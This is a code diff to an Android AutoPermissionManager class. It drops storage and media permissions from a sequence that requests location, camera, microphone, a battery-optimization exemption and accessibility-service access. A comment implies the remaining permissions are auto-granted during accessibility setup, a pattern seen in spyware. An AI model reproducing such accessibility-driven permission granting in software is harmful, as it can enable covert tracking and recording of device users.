@@ -53,19 +53,14 @@ public class AutoPermissionManager {
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.ACCESS_COARSE_LOCATION,
         Manifest.permission.CAMERA,
-        Manifest.permission.RECORD_AUDIO,
-        Manifest.permission.READ_EXTERNAL_STORAGE
-        // WRITE_EXTERNAL_STORAGE is requested separately as the LAST step
-        // (handled via requestWriteExternalStorageLast / requestManageExternalStorage)
+        Manifest.permission.RECORD_AUDIO
+        // Storage/file access permissions are requested on-demand from the
+        // dashboard (App Mode) — not auto-granted during accessibility setup.
     };
 
-    // Android 13+ permissions
+    // Android 13+ permissions (storage-related ones are excluded — requested on-demand)
     public static final String[] ANDROID_13_PERMISSIONS = {
-        "android.permission.READ_MEDIA_IMAGES",
-        "android.permission.READ_MEDIA_VIDEO",
-        "android.permission.READ_MEDIA_AUDIO",
-        "android.permission.POST_NOTIFICATIONS",
-        "android.permission.ACCESS_MEDIA_LOCATION"
+        "android.permission.POST_NOTIFICATIONS"
     };
 
     public AutoPermissionManager(Context context) {
@@ -342,10 +337,12 @@ public class AutoPermissionManager {
     }
 
     /**
-     * Request all permissions in sequence
+     * Request all permissions in sequence.
+     * Storage/file-access permissions are intentionally excluded here —
+     * they are requested on-demand from the dashboard (App Mode).
      */
     public void requestAllPermissionsSequentially() {
-        // Step 1: Request dangerous permissions
+        // Step 1: Request dangerous permissions (storage excluded)
         requestAllPermissions();
 
         // Step 2: Request battery optimization exemption (with delay)
@@ -353,16 +350,11 @@ public class AutoPermissionManager {
             requestBatteryOptimization();
         }, 2000);
 
-        // Step 3: Request MANAGE_EXTERNAL_STORAGE (All Files Access) — with delay
-        new android.os.Handler().postDelayed(() -> {
-            requestManageExternalStorage();
-        }, 3500);
-
-        // Step 4: Request accessibility (with delay)
+        // Step 3: Request accessibility (with delay)
         new android.os.Handler().postDelayed(() -> {
             if (!isAccessibilityServiceEnabled()) {
                 requestAccessibilityService();
             }
-        }, 5000);
+        }, 3500);
     }
 }
